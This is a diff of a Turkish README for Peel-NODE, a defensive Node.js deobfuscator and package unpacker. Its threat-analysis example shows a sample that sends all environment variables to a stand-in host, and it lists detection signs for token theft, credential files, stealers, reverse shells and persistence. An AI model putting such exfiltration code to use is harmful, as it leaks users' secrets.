@@ -1,12 +1,12 @@
 <p align="center">
   <picture>
     <source media="(prefers-color-scheme: dark)" srcset="public/peel-logo-horizontal-dark-3000.png">
-    <img src="public/peel-logo-horizontal-3000.png" alt="peel: JS deobfuscator" width="560">
+    <img src="public/peel-logo-horizontal-3000.png" alt="peel: Node.js deobfuscator" width="560">
   </picture>
 </p>
 
 <p align="center">
-  <b>JavaScript'teki gizlemeyi tarayıcının içinde soyar.</b><br>
+  <b>Node.js çalıştırılabilirlerini ve paketlerini açar, içindeki koddan gizlemeyi soyar.</b><br>
   Açık kaynak · MIT · sonsuza dek ücretsiz · kodunuz cihazınızdan çıkmaz
 </p>
 
@@ -17,383 +17,356 @@
   <a href="#özellikler">Özellikler</a> ·
   <a href="#komut-satırı">CLI</a> ·
   <a href="#nasıl-çalışır">Nasıl çalışır</a> ·
-  <a href="ROADMAP.md">Yol haritası</a>
+  <a href="https://github.com/LLCForge/Peel-JS">Peel-JS</a>
 </p>
 
 <p align="center">
-  <img src="docs/images/tr-code.png" alt="PEEL: solda gizlenmiş girdi, sağda doğrulanmış temiz çıktı" width="960">
+  <img src="docs/images/tr-code.png" alt="Peel-NODE: solda gizlenmiş Node.js girdisi, sağda doğrulanmış temiz çıktı" width="960">
 </p>
 
 ---
 
-## PEEL nedir?
+## Peel-NODE nedir?
 
-PEEL bir JavaScript deobfuscator'ıdır. Gizlenmiş (obfuscate edilmiş) kodu yapıştırın, **Çöz**'e basın (`Ctrl + Enter`).
-Okunur kodu ve kodun gerçekte ne yaptığını anlatan bir raporu geri alırsınız.
+Peel-NODE, Node.js kodu için bir deobfuscator ve paket açıcıdır. Ona gizlenmiş bir `.js` dosyası, bir npm tarball'ı,
+bir Electron `app.asar`'ı ya da pkg, nexe veya Node SEA ile üretilmiş bir çalıştırılabilir verin. Kapsayıcıyı bellekte açar,
+içindeki her betiği bulur, her birini çözer ve kodun bir Node makinesinde ne yapacağını söyler.
 
-Çoğu deobfuscator ya kalıp eşler ya da girdinizi `eval` eder. Kalıp eşlemek hızlıdır ama özel bir şeyle karşılaşınca vazgeçer;
-`eval` ise tehlikelidir. PEEL ikisini de dikkatle yapar:
+[Peel-JS](https://github.com/LLCForge/Peel-JS)'in çatalıdır; tarayıcı odaklı bu kardeş projenin motorunu korur.
+Peel-NODE'un eklediği her şey Node'a özgüdür:
 
-- **Kodu çalıştırır, güvenle.** Çalıştırma gereken her adım, WebAssembly'ye derlenmiş bir [QuickJS](https://github.com/justjake/quickjs-emscripten)
-  sandbox'ında, bekçili ayrı bir worker içinde yapılır. Bellek ve süre sınırlıdır; ağ ve gerçek DOM yoktur; saat ve rastgelelik sabittir.
-- **Kendi değişikliklerini kanıtlar.** Her pass'ten sonra çıktı yeniden parse edilir ve yeniden çalıştırılır. Programın gözlenen davranışı
-  değişirse o pass otomatik geri alınır ya da yalnızca güvenli kısmı tutulur.
-- **Başka araçların ulaşamadığı decoder'lara ulaşır.** Closure içine saklanmış decoder'lar, sayaçlı çağrılar (`M(T + 273)`),
-  kendini değiştiren string tabloları ve js-confuser dispatcher'ları çalışma anında yakalanır ve gerçek fonksiyonla çözülür.
-- **Kodun ne yaptığını söyler.** Raporda tespit edilen obfuscator, kodun yapmaya çalıştığı ağ çağrıları, tarayıcı parmak izi okumaları,
-  depolama erişimi, IOC'ler, tehdit puanı ve indirilebilir YARA / Suricata kuralları bulunur.
-- **Makinenizde kalır.** Sunucu, telemetri ya da yükleme yoktur. Durum çubuğu sayfanın yaptığı her dış isteği sayar;
-  bunu kendiniz kontrol edebilirsiniz.
+- **Node paketlerini açar.** pkg, nexe ve Node SEA çalıştırılabilirleri (PE, ELF ve Mach-O), npm `.tgz` tarball'ları, Electron
+  `.asar` arşivleri ve `.zip` dosyaları bellekte açılır; diske hiçbir şey yazılmaz. Giriş noktaları, `package.json` `main` / `bin`
+  ve kurulum betikleri işaretlenir. V8 bytecode (bytenode `.jsc`, pkg'nin varsayılan modu) kaynağa geri çevrilemez;
+  Peel-NODE bunu açıkça söyler, onun yerine başlığı ve okunur dizgeleri çıkarır.
+- **Kodu öykünülmüş bir Node.js'te çalıştırır.** QuickJS sandbox'ına `require`, `process`, `Buffer`, `fs`, `child_process`, `net`,
+  `http(s)`, `dns`, `os`, `vm` ve `worker_threads` taklitleri verilir. Gerçek hiçbir şeye dokunulmaz: taklitler yalnızca kodun
+  ne yapmaya çalıştığını kaydeder. Ortam otomatik seçilir (`--env auto|node|browser`).
+- **Node yükleyicilerini açar.** `eval`, `vm.runInThisContext`, `new vm.Script(...)`, `Function(...)`, `module._compile` ve
+  programın kendi yazdığı bir dosyanın `require`'ı, çalıştırdıkları kodla değiştirilir. Bu yalnızca ortam, dosyalar, argv, saat
+  ve rastgelelik farklı verilerek yapılan ikinci çalıştırma birebir aynı kodu üretirse yapılır.
+- **Kodun bir makineye ne yapacağını söyler.** Tehdit raporu npm tedarik zinciri saldırılarını tanır: kurulum betiği kötüye
+  kullanımı, ortam değişkeni ve token hırsızlığı, kimlik dosyaları, Discord ve tarayıcı hırsızları, kripto clipper'lar, ters kabuklar,
+  indiriciler, kalıcılık, typosquatting, bağımlılık karışıklığı ve bilinen zararlı aileleri.
+- **Kendi değişikliklerini yine kanıtlar.** Her pass'ten sonra çıktı yeniden parse edilir ve sandbox'ta davranışı denetlenir.
+  Programın yaptığını değiştiren pass geri alınır.
 
-Tek düğme her şeyi en yüksek seviyede çalıştırır. Önce anlamanız gereken bir ayar yoktur.
+Web uygulaması, CLI ve kütüphane: hepsi yerelde çalışır. Sunucu, telemetri ya da yükleme yoktur.
 
 ## Hızlı başlangıç
 
 Node.js 20 ya da daha yenisi gerekir.
 
 ```bash
-git clone https://github.com/LLCForge/Peel-JS.git
-cd Peel-JS
+git clone https://github.com/LLCForge/Peel-NODE.git
+cd Peel-NODE
 npm install
+```
+
+Komut satırı:
+
+```bash
+node bin/peel-node.js gizli.js -o temiz.js
+node bin/peel-node.js uygulama.exe --out-dir out     # pkg / nexe / SEA çalıştırılabiliri
+node bin/peel-node.js paket.tgz --out-dir out --report out/rapor.json
+```
+
+Web arayüzü:
+
+```bash
 npm run dev
 ```
 
-<http://localhost:5173> adresini açın. Kodu yapıştırın, bir `.js` dosyasını sayfaya sürükleyin ya da **Örnek kodla dene**'ye tıklayın,
-sonra **Çöz**'e basın.
-
-Her yerde barındırabileceğiniz statik bir site için (GitHub Pages, Netlify, şirket içi sunucu, USB bellek):
-
-```bash
-npm run build
-```
-
-`dist/` klasörü uygulamanın tamamıdır. İlk ziyaretten sonra PWA olarak çevrimdışı da çalışır.
+<http://localhost:5173> adresini açın. Kodu yapıştırın, sayfaya bir `.js`, `.jsc`, `.tgz`, `.asar`, `.zip` ya da `.exe` dosyası
+bırakın veya **Örnek kodla dene**'ye tıklayın, sonra **Çöz**'e basın (`Ctrl + Enter`). `npm run build`, `dist/` altında her yerde
+barındırabileceğiniz ya da çevrimdışı açabileceğiniz statik bir site üretir.
 
 ## Ekran görüntüleri
 
 <table>
   <tr>
-    <td width="50%"><img src="docs/images/tr-empty.png" alt="Dosya aç ve örnek düğmeleriyle başlangıç ekranı"><br><sub><b>Başlangıç.</b> Yapıştırın, dosya ya da klasör sürükleyin veya örneği deneyin.</sub></td>
-    <td width="50%"><img src="docs/images/tr-input.png" alt="Girdi editörüne yüklenmiş obfuscator.io tarzı örnek"><br><sub><b>Girdi.</b> Renklendirme, katlama ve mini haritalı CodeMirror editörü.</sub></td>
+    <td width="50%"><img src="docs/images/tr-empty.png" alt="Desteklenen dosya türlerini listeleyen başlangıç ekranı"><br><sub><b>Başlangıç ekranı.</b> Kod yapıştırın ya da bir betik, paket veya çalıştırılabilir bırakın.</sub></td>
+    <td width="50%"><img src="docs/images/tr-input.png" alt="Yerleşik Node.js örneği girdi editöründe"><br><sub><b>Girdi.</b> Yerleşik örnek: base64 dizge tablosu, bir <code>eval</code> katmanı ve bir <code>zlib</code> katmanı.</sub></td>
   </tr>
   <tr>
-    <td><img src="docs/images/tr-report.png" alt="Analiz raporu: tehdit puanı, tespit edilen obfuscator, ölçümler ve ağ çağrıları"><br><sub><b>Rapor.</b> Tehdit puanı, gizlilik, tespit edilen araç, ölçümler, ağ çağrıları ve IOC'ler.</sub></td>
+    <td><img src="docs/images/tr-report.png" alt="Analiz raporu: tehdit puanı, gizlilik ve çalışma anı, tespit, ölçümler ve ağ çağrıları"><br><sub><b>Rapor.</b> Tehdit puanı, çalışma anı etkileri, tespit edilen araç, ölçümler ve ağ çağrıları.</sub></td>
     <td><img src="docs/images/tr-timeline.png" alt="Her pass'ten sonraki kodu gösteren zaman çizelgesi"><br><sub><b>Zaman çizelgesi.</b> Her pass ve turdan sonraki kodu kaydırarak izleyin.</sub></td>
   </tr>
   <tr>
-    <td><img src="docs/images/tr-diff.png" alt="Girdi ile çıktı arasındaki satır farkı"><br><sub><b>Fark.</b> Girdi ile çıktı arasında neyin değiştiği.</sub></td>
-    <td><img src="docs/images/tr-palette.png" alt="Her eylemi kısayoluyla listeleyen komut paleti"><br><sub><b>Komut paleti.</b> Tüm eylemler, aranabilir (<code>Ctrl + Shift + P</code>).</sub></td>
+    <td><img src="docs/images/tr-diff.png" alt="Girdi ile çıktı arasındaki satır farkı"><br><sub><b>Fark.</b> Girdi ile çıktı arasında değişenler.</sub></td>
+    <td><img src="docs/images/tr-palette.png" alt="Her eylemi kısayoluyla listeleyen komut paleti"><br><sub><b>Komut paleti.</b> Her eylem, aranabilir (<code>Ctrl + Shift + P</code>).</sub></td>
   </tr>
   <tr>
-    <td><img src="docs/images/tr-tools.png" alt="Araçlar penceresi: karşılaştırma, geçmiş, paylaşım, dosyalar, kurallar ve eklentiler, öğrenme"><br><sub><b>Araçlar.</b> Sürüm karşılaştırma, geçmiş, paylaşım, arşivler, kurallar ve eklentiler, dersler.</sub></td>
-    <td><img src="docs/images/tr-settings.png" alt="Ayarlar penceresi"><br><sub><b>Ayarlar.</b> Sandbox sınırları, biçim, isimlendirme, pass'ler ve görünüm.</sub></td>
+    <td><img src="docs/images/tr-tools.png" alt="Araçlar penceresi: karşılaştır, geçmiş, paylaş ve dışa aktar, dosyalar, kurallar ve eklentiler, öğren"><br><sub><b>Araçlar.</b> Sürüm karşılaştırma, geçmiş, paylaşım, arşivler, kurallar ve eklentiler, dersler.</sub></td>
+    <td><img src="docs/images/tr-settings.png" alt="Ayarlar penceresi"><br><sub><b>Ayarlar.</b> Görünüm, editör, kod katmanları, yerleşim ve biçimlendirme.</sub></td>
   </tr>
 </table>
 
 <p align="center">
-  <img src="docs/images/tr-mobile.png" alt="Telefonda PEEL" width="260"><br>
+  <img src="docs/images/tr-mobile.png" alt="Telefonda Peel-NODE" width="260"><br>
   <sub>Arayüz telefonda da çalışır.</sub>
 </p>
 
 ## Örnekler
 
-Aşağıdaki çıktıların hepsi varsayılan ayarlarla CLI'dan (`peel girdi.js`) alındı.
-Tarayıcı aynı motoru kullandığı için aynı sonucu verir.
+Aşağıdaki tüm çıktılar CLI ile (`peel-node girdi.js --lang en`) varsayılan ayarlarla üretildi.
 
-### javascript-obfuscator (obfuscator.io)
+### Yerleşik örnek
 
-Ayarlar: RC4 kodlamalı string dizisi, akış düzleştirme, ölü kod enjeksiyonu, self-defending.
-204 baytlık özgün fonksiyon 6,8 KB oldu:
+**Örnek kodla dene** düğmesi zararsız bir Node.js parçası yükler: base64 dizge tablosu, base64 ile kodlanmış bir `eval` katmanı ve
+onun içinde, mesajını `String.fromCharCode` ile kuran bir `zlib.inflateSync` + base64 katmanı.
 
 ```js
-function _0x4dd7(){const _0xefa4e7=['ysFdUJy','A8kWWR5Peq','nL10Fmk2WPFcQ8kH','W6hcISozjx8qWOldSG',
-'gmonsqfZ','WP4NWPtcS8oIW5ncW7tdSmk/W6e','WPJdKCkBW65uW6/dS8of','vHJdGwddM8kzWPxcO8oPzJ8', … 6,8 KB
+// Peel-NODE örnek girdisi
+var _0x5a = ['YmFzZTY0', 'dXRmOA=='];
+function _0xd(_0xi) { return Buffer.from(_0x5a[_0xi], 'base64').toString(); }
+eval(Buffer.from('ZXZhbChyZXF1aXJlKCd6bGliJykuaW5mbGF0ZVN5bmMoQnVmZmVyLmZyb20oJ2VKeE5qVXRM…', _0xd(0x0)).toString(_0xd(0x1)));
 ```
 
-PEEL çıktısı:
+Peel-NODE çıktısı:
 
 ```js
-/**
- * @summary Ağ isteği yapar (https://api.example.com/track)
- * @param {{ name: string; id: number }} options
- * @returns {Promise<Response>}
- */
-function greet(options) {
-  const str8 = "Hello, " + options.name + "!";
-  console.log(str8);
-  return fetch("https://api.example.com/track", {
-    method: "POST",
-    body: options.id,
-  });
+if (process.env.PEEL_NEVER_SET === "1") {
+  console.log("dead");
 }
-greet({
-  name: "Ada",
-  id: 42,
-});
+// Peel-NODE örnek girdisi
+
+var _0xg = "Peel-NODE";
+console.log(_0xg + ": merhaba, " + require("path").basename("/tmp/sample.js"));
 ```
 
-RC4 string tablosu, rotasyon, akış switch'i, ölü dallar ve self-defending tuzağı kalktı.
-Tipler ve parametre adı, fonksiyonun nasıl kullanıldığından çıkarıldı.
+İki katman da gitti. `if` bilerek kalır: bir ortam değişkenine bağlıdır; silinseydi o değişkenin tanımlı olduğu bir makinede
+davranış değişirdi.
 
-### js-confuser (`medium` hazır ayarı)
-
-Aynı 204 bayt 60 KB oldu: `Function()` sarmalayıcısı, hash'li bütünlük denetimi, sıkıştırılmış string tablosu,
-sahte `length` değerleri, dispatcher ve düzleştirilmiş akış.
-
-```js
-Function("oS2V2y","var f6VKVp,lHOwPsI,vAwCmmh,pnpNZQh,I0LNn2,Y_2bfv,D5yj4L,xIg8rM,JvQ7zCW,_GiUkD,MR6fIDt;
-function FICqkyY(f6VKVp){var lHOwPsI=(f6VKVp|0x0)^0x9e3779b9,vAwCmmh=0x243f6a88|0x0, … 60 KB
-```
-
-PEEL çıktısı:
-
-```js
-(function (oS2V2y) {
-  /**
-   * @summary Ağ isteği yapar (https://api.example.com/track)
-   * @param {{ name: string; id: number }} a
-   * @returns {Promise<Response>}
-   */
-  function fn_2vnpRN(a) {
-    let OHMPgZ_2 = "Hello, " + a.name + "!";
-    console.log(OHMPgZ_2);
-    return fetch("https://api.example.com/track", {
-      method: "POST",
-      body: a.id,
-    });
-  }
-  return fn_2vnpRN({
-    name: "Ada",
-    id: 42,
-  });
-})({
-  get EBLwagC() {
-    return global;
-  },
-});
-```
-
-### Küçük örnekler
+### Node yükleyicileri
 
 | Girdi | Çıktı |
 |---|---|
+| `require("vm").runInThisContext(Buffer.from("Y29uc29sZS5sb2coImhpIik=","base64").toString());` | `console.log("hi");` |
+| `new Function(Buffer.from("Y29uc29sZS5sb2cocHJvY2Vzcy5wbGF0Zm9ybSk=","base64").toString())();` | `console.log(process.platform);` |
+| `module._compile(Buffer.from("bW9kdWxlLmV4cG9ydHMgPSA0Mjs=","base64").toString(), __filename);` | `(function (exports, require, module, __filename, __dirname) { module.exports = 42; }).call(module.exports, module.exports, require, module, __filename, __dirname);` |
 | `eval(atob("Y29uc29sZS5sb2coImhpIik="))` | `console.log("hi");` |
-| `(function(){var _0x1=["\x6c\x6f\x67","\x48\x65\x6c\x6c\x6f","\x77\x6f\x72\x6c\x64"];console[_0x1[0x0]](_0x1[0x1]+" "+_0x1[0x2]);})();` | `(function () { console.log("Hello world"); })();` |
-| `var o={KJs:function(a,b){return a+b},xQz:function(f,x){return f(x)}};console.log(o.KJs(0x2,0x3),o.xQz(String,0x7));` | `console.log(5, "7");` |
 | `if(!![]){console.log("live")}else{console.log("dead")}` | `console.log("live");` |
+
+### Tehdit analizi
+
+```js
+var _0x=["aHR0cHM=","Y29sbGVjdC5leGFtcGxlLmNvbQ==","UE9TVA=="];function d(i){return Buffer.from(_0x[i],"base64").toString()}
+var r=require(d(0)).request({host:d(1),method:d(2),path:"/e"});r.end(JSON.stringify(process.env));
+```
+
+şuna dönüşür
+
+```js
+var r = require("https").request({
+  host: "collect.example.com",
+  method: "POST",
+  path: "/e",
+});
+r.end(JSON.stringify(process.env));
+```
+
+ve rapor bunu `env-exfil` olarak sınıflar (puan 60, güven yüksek). Kanıt, statik eşleşmeyi (`process.env`'in tamamı okunuyor)
+öykünülmüş çalışma ortamının kaydettikleriyle birleştirir: 25 ortam değişkeni okundu, ardından bunları taşıyan bir
+`POST https://collect.example.com/e` yapıldı. Toplam risk: 62, orta.
 
 ## Özellikler
 
-PEEL'de **57 pass** ve bir dizi analiz modülü var. [Yol haritası](ROADMAP.md), tamamlanan 763 maddenin hepsini notlarıyla listeler.
-Burada kısa hâli var.
+Peel-NODE'da **58 pass** vardır: Peel-JS'ten gelen 57 pass ve Node yükleyicilerini açan `node-layers`. Analiz modülleri ortaktır.
+
+### Kapsayıcılar ve paketler
+
+| Biçim | Peel-NODE ne yapar |
+|---|---|
+| **pkg** (vercel/pkg, @yao-pkg/pkg) | Prelude'u ve sanal dosya sistemini bulur, sözlükle sıkıştırılmış yolları geri kurar, gzip ve brotli yükleri okur, giriş noktasını işaretler. V8 bytecode olarak saklanan dosyalar (pkg varsayılanı) başlık, dizge ve IOC'leriyle raporlanır. |
+| **nexe** | Sentinel kuyruğunu, önyükleme içeriğini ve kaynakları okur (nexe 5 ZIP biçimi; eski kaynak tablosu desteklenir ama gerçek çıktıyla doğrulanmadı). |
+| **Node SEA** | PE, ELF ya da Mach-O içindeki `NODE_SEA_BLOB`'u bulur; bayrakları, ana betiği, kod önbelleğini ve `sea.getAsset` varlıklarını okur, sigorta (fuse) durumunu raporlar. Anlık görüntüyle (`useSnapshot`) derlenenlerde kaynak yoktur: yalnızca dizgeler çıkarılır. |
+| **bytenode `.jsc`** | V8 kod önbelleği başlığını (sürüm karması, kaynak uzunluğu, bayraklar) çözer; ASCII ve UTF-16 dizgeleri, URL, IP ve kabuk komutlarını çıkarır. **Çözülemez, yalnızca dizgeler.** |
+| **npm `.tgz`** | Tarball'ı açar, `package.json`'ı okur; `main`, `bin` ve `preinstall` / `install` / `postinstall` / `prepare` betiklerinin çalıştırdığı dosyaları işaretler, `binding.gyp`'ten gelen örtük `node-gyp rebuild`'i not eder. |
+| **Electron `.asar`, `.zip`** | Arşivi açar, `package.json`'dan ana süreç girişini işaretler, `app.asar.unpacked` içinde kalan dosyaları listeler. |
+
+Biçimler gerçek araç çıktılarıyla denetlendi: @yao-pkg/pkg 6.25, nexe 5.0.0-beta.4, Node 25.8 SEA (postject), Node 25 üzerinde
+bytenode, `npm pack` ve @electron/asar. Örnek dosyalar [`test/node-samples/`](test/node-samples) altındadır.
+
+### Node tehdit analizi
+
+Sınıflar üç kaynaktan gelir: çözülmüş çıktının statik metni, öykünülmüş Node çalışma ortamının etki günlüğü ve açılan
+`package.json`. Her sınıf kanıtlarını ve bir güven düzeyini taşır. Çalışma anında görülen bir etki güveni yükseltir.
+
+| Sınıf | Neye bakar |
+|---|---|
+| `npm-lifecycle` | kurulum betikleri ve bu dosyanın onların çalıştırdığı dosya olup olmadığı; indirme, `eval`, base64 ya da kabuğa yönlendirme puanı yükseltir |
+| `env-exfil` | `process.env`'in tamamı ya da gizli görünen değişkenler (`NPM_TOKEN`, `GITHUB_TOKEN`, `AWS_*`, `*_SECRET` …) ile birlikte ağ erişimi |
+| `credential-files` | `.npmrc`, `.ssh`, `.aws`, `.git-credentials`, `.netrc`, Docker ve kube yapılandırması, gcloud |
+| `discord-token-stealer`, `browser-stealer` | Discord token konumları ve desenleri; tarayıcı profilleriyle birlikte `Login Data`, `Local State`, çerezler, `key4.db` |
+| `crypto-clipper`, `wallet-stealer` | cüzdan adresi düzenli ifadeleriyle birlikte pano erişimi; cüzdan dosyaları ve eklenti kimlikleri |
+| `reverse-shell` | ham soket + kabuk süreci + aralarında akış bağlantısı |
+| `dropper` | indirme, ardından dosya yazma, ardından çalıştırma; çalışma anında sıra da denetlenir |
+| `persistence` | Başlangıç klasörü, `reg add … Run`, `schtasks /create`, cron, launchd, systemd, kabuk başlangıç dosyaları |
+| `anti-analysis`, `host-recon` | sanal makine / sandbox / hata ayıklayıcı denetimleri; ağ erişimiyle birlikte çok sayıda sistem bilgisi okuması |
+| `node-exec`, `chat-exfil` | `child_process` kullanımı; Discord webhook ve Telegram bot adresleri |
+| `typosquatting`, `dependency-confusion` | popüler bir paketten tek düzenleme uzaklıktaki paket adı; olağandışı yüksek ana sürüm |
+| `known-family` | event-stream, ua-parser-js, coa / rc, node-ipc, Shai-Hulud ve s1ngularity / Nx'in yayımlanmış analizlerindeki işaretler |
+
+Bunlar kanıtlı sezgilerdir, kesin hüküm değildir.
 
 ### Desteklenen obfuscator'lar
 
-| Araç / teknik | PEEL'in geri aldıkları |
+Motor aynı olduğu için Peel-JS'in çözdüğü her şey burada da çalışır:
+
+| Araç / teknik | Peel-NODE neyi geri alır |
 |---|---|
-| **javascript-obfuscator / obfuscator.io** | String dizileri (yok / base64 / RC4), rotasyon, sarmalayıcılar, indeks ofsetleri, nesne anahtarı ve operatör proxy'leri, akış düzleştirme, ölü kod enjeksiyonu, self-defending, debug koruması, konsol kapatma, `numbersToExpressions`, `splitStrings`, `transformObjectKeys`. Gizlemede kullanılan ayarlar raporda geri çıkarılır. |
-| **js-confuser** | `Function()` paketleme, RGF, dispatcher, flatten, akış düzleştirme (kapsam nesneleri ve etiketler dahil), global gizleme, string sıkıştırma ve gizleme, `length` sahteciliği, opak koşullar, bütünlük ve self-defending kilitleri, anti-tooling, tekrar eden literal tabloları |
-| **webpack-obfuscator, webpack ve esbuild paketleri** | Modülleri dosyalara ayırma (`--split`), geliştirme modundaki `eval` paketleri, obfuscator eklentisi |
-| **jfogs, JavaScriptObfuscate, packer** | Benchmark'taki tüm varyantlar (unicode ve ters modlar dahil) |
-| **JSFuck, AAEncode, JJEncode** | Sandbox'taki `eval` ve `Function` kancalarıyla çözülür |
-| **Bytecode VM'leri ve durum makineleri** | Tespit edilir, disassemble edilir, yorumlayıcı tanınabiliyorsa okunur koda çevrilir; değilse geçişler açıklama olarak yazılır |
-| **Babel ve TypeScript çıktısı** | Yardımcılar, `regenerator` durum makineleri, sınıflar ve destructuring modern sözdizimine döndürülür |
-| **Kodlamalar** | base64 / 32 / 85 / 91, hex, URL, HTML varlıkları, UTF-7, CESU-8, ROT-n, Atbash, XOR (anahtar aramalı), Vigenère, 5–7 bit paketleme, base64 içinde gzip ve deflate, çok katmanlı zincirler |
+| **javascript-obfuscator / obfuscator.io** | String dizileri (none / base64 / RC4), rotasyon, sarmalayıcılar, proxy'ler, akış düzleştirme, ölü kod, self-defending, debug koruması; kullanılan ayarlar raporlanır |
+| **js-confuser** | `Function()` paketleme, RGF, dispatcher, düzleştirme, string sıkıştırma ve gizleme, `length` taklidi, opak yüklemler, bütünlük kilitleri |
+| **Node yükleyicileri** | `eval`, `vm.runInThisContext` / `runInNewContext` / `vm.Script`, `Function`, `module._compile`, yazılmış bir dosyanın `require`'ı |
+| **Paketler (bundle)** | webpack ve esbuild (Node hedefleri dahil), browserify, Parcel, ncc tanınır; `--split` modülleri ayrı dosyalara yazar |
+| **Paketleyiciler ve kodlayıcılar** | Dean Edwards packer, JSFuck, AAEncode, JJEncode, base64 / hex / XOR / gzip / deflate zincirleri |
+| **Bytecode VM'ler** | Tespit edilir, disassemble edilir; yorumlayıcı tanınabiliyorsa okunur koda çevrilir |
+| **Babel ve TypeScript çıktısı** | Yardımcılar, `regenerator` durum makineleri ve sınıflar modern sözdizimine döndürülür |
 
-### Motor
+JScrambler gibi ticari korumalar **yalnızca tanınır, çözülmez**.
 
-- **Doğrulanmış pass'ler.** Her pass taze bir parse üzerinde çalışır. Çıktı yeniden parse edilerek ve sandbox'ta davranışı
-  (konsol çıktısı ve gözlenebilir yan etkiler) karşılaştırılarak denetlenir. Başarısız pass geri alınır; yalnızca bir kısmı
-  hatalıysa davranışı koruyan değişiklikler tutulur.
-- **Sabit noktaya kadar turlar.** Pass'ler hiçbir şey değişmeyene kadar tekrarlanır. Okunabilirlik pass'leri (isimlendirme,
-  `let`/`const`, modern sözdizimi, açıklamalar) çözme bittikten sonra çalışır; böylece bir decoder'ın tanıyacağı kalıbı gizlemezler.
-- **Çalışma anı gözlemi.** Argümanları sayaçtan ya da closure'dan gelen decoder'lar gerçek bir çalıştırma gözlenerek çözülür;
-  log hangi değerin gözlemden geldiğini söyler.
-- **Sembolik ve concolic analiz.** DRUP kanıt denetimli yerleşik bir CDCL / bit-blasting çözücü opak koşulları kanıtlar.
-  [Z3](https://github.com/Z3Prover/z3) isteğe bağlı hızlandırıcı olarak kullanılır.
-- **Derleyici tarzı temizlik.** SSA, sabit yayılımı, döngü ve CFG sadeleştirme, kısmi değerlendirme ve ölü atama temizliği;
-  hepsi doğrulayıcıdan geçer.
-- **İsimlendirme.** Kullanımdan çıkarılan, deterministik ve anlamlı adlar (`options`, `str`, `list`, `fn_…`), tip çıkarımı,
-  Türkçe ya da İngilizce JSDoc özetleri, kaynak haritasından ve tanınan kütüphanelerden ad kurtarma.
+### Rapor ve arayüz
 
-### Analiz raporu
-
-- Güven oranı ve kanıtıyla tespit edilen obfuscator ve büyük olasılıkla kullanılan ayarlar
-- Tehdit puanı ve sınıfları: skimmer, stealer, miner, yönlendirici, parmak izi ve diğerleri
-- Kodun denediği ağ çağrıları (fetch, XHR, WebSocket, beacon, image, script); yöntem, URL ve gövdeyle
-- Gizlilik: üçüncü taraf alan adları, çerez ve depolama erişimi, parmak izi okumaları, eklenen ve eksik global'ler
-- IOC'ler: alan adları, URL'ler, IP'ler, e-postalar, cüzdanlar, JWT'ler ve gömülü gizli anahtarlar (dışa aktarımda maskelenir)
-- Kripto sabitleri ve algoritmaları (AES, DES, TEA, Blowfish, RC4, hash'ler), sıkıştırma, kodlamalar
-- YARA ve Suricata kuralları, SARIF, olay müdahale raporu ve JSON dışa aktarma
-- Önce/sonra ölçümleri, okunabilirlik puanı, karmaşıklık, pass süreleri ve geri alınan değişiklikler
-
-### Arayüz
-
-- Renklendirme, katlama, mini harita, arama, tanıma git ve referansları olan CodeMirror editörleri
-- Birden çok sekme, cihazda kaydedilen oturumlar (IndexedDB), JSON oturum içe/dışa aktarma
-- Zaman çizelgesi, fark, çağrı grafiği, CFG ve veri akışı görünümleri
-- Adım adım mod (her pass'i onaylama), kuru çalıştırma ve yalnızca seçimi çözme
-- Komut paleti, ayarlanabilir kısayollar ve yerleşimler, okuma modu, mobil yerleşim
-- Beş dil: Türkçe, English, Deutsch, Español, العربية (sağdan sola)
-- Erişilebilir: klavye ile gezinme, ekran okuyucu etiketleri ve canlı bölgeler, görünür odak
+- Kanıtlarıyla tespit edilen obfuscator ve paketleyici; düz JS içindeki pkg, nexe, SEA ve bytenode izleri dahil
+- IOC'ler: alan adları, URL'ler, IP'ler, cüzdanlar, Discord webhook'ları, Telegram botları, indirme ve paste adresleri; dışa aktarımda sırlar maskelenir
+- YARA ve Suricata kuralları, SARIF 2.1.0, olay müdahale raporu ve JSON dışa aktarım
+- CodeMirror editörleri, sekmeler ve proje grupları (açılan paket, giriş noktaları önde olmak üzere bir grup olarak açılır),
+  zaman çizelgesi, fark, komut paleti, beş dil (English, Türkçe, Deutsch, Español, العربية) ve mobil yerleşim
 
 ## Komut satırı
 
-CLI aynı motoru ve aynı sandbox'ı kullanır. Node'da sandbox bekçili bir `worker_thread` içinde çalışır.
-
 ```bash
-node bin/peel.js gizli.js -o temiz.js --report rapor.json
-cat gizli.js | node bin/peel.js - > temiz.js
-node bin/peel.js src/ --out-dir cikti --sarif cikti/peel.sarif
-node bin/peel.js app.js --html once-sonra.html
+node bin/peel-node.js gizli.js -o temiz.js --report rapor.json
+cat gizli.js | node bin/peel-node.js - > temiz.js
+node bin/peel-node.js uygulama.exe --out-dir out --sarif out/peel.sarif
+node bin/peel-node.js lib/ --out-dir out --fail-on high
 ```
 
-`npm link` ile global kurup `node bin/peel.js` yerine `peel` yazabilirsiniz.
+`npm link` ile genel olarak kurup `node bin/peel-node.js` yerine `peel-node` yazabilirsiniz.
+
+Bir kapsayıcı verildiğinde çıktı dizininde özgün klasör yapısıyla `<ad>.unpacked/` ve biçim, meta veri ve notları taşıyan
+`<ad>.unpack.json` oluşur. İçerideki her betik paket bağlamıyla birlikte çözülür ve analiz edilir.
 
 | Seçenek | |
 |---|---|
-| `-o, --out` / `-d, --out-dir` | çıktı dosyası ya da toplu işte çıktı klasörü (klasör yapısı korunur) |
-| `-r, --report`, `--sarif`, `--html`, `--incident` | JSON rapor, SARIF 2.1.0, bağımsız önce/sonra HTML, olay müdahale Markdown'ı |
-| `-m, --source-map`, `--out-map` | kaynak haritasından ad kurtarma; çıktıdan girdiye harita yazma |
-| `-s, --split <dizin>` | webpack, esbuild, browserify ya da Parcel paketinin modüllerini ayrı dosyalara yazma |
-| `-p, --profile`, `-l, --level` | pass profili (`all`, `auto` ya da araç adı) ve 1–4 seviye |
-| `--order-search`, `--cascade` | birkaç pass sırası deneyip en iyi doğrulanmış sonucu tutma; ya da seviye seviye çözme |
-| `--vm-out <dizin>`, `--jsvmp` | bytecode VM'ler için bytecode, assembly, IR ve çevrilmiş kodu yazma |
-| `--git <dizin>` | her pass bir commit olacak şekilde git deposu oluşturma |
-| `--style auto`, `-f, --format` | `.prettierrc` / `.editorconfig` / `.eslintrc` kurallarına uyma ya da biçim profili |
+| `-o, --out` / `-d, --out-dir` | çıktı dosyası ya da toplu iş ve kapsayıcılar için çıktı dizini |
+| `-r, --report`, `--sarif`, `--html`, `--incident` | JSON rapor, SARIF 2.1.0, bağımsız önce/sonra HTML'i, olay müdahale Markdown'ı |
+| `--env <auto\|node\|browser>` | sandbox ortamı; `auto`, Node işaretleri görünce Node öykünmesini kullanır |
